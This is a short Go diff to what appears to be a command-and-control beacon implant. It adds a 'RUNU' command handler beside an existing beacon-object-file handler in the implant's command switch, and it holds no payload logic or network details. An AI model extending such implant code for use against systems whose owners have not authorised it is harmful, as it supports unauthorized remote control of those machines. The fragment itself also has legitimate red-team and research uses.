@@ -221,6 +221,9 @@ func main() {
 						case packet.CMD_TYPE_BOF:
 							result, err = services.CMDBof(cmdBuf)
 							callbackType = 0
+						case packet.CMD_TYPE_RUNU:
+							result, err = services.CmdRunu(cmdBuf)
+							callbackType = 0
 						default:
 							err = errors.New("This type is not supported now.")
 						}
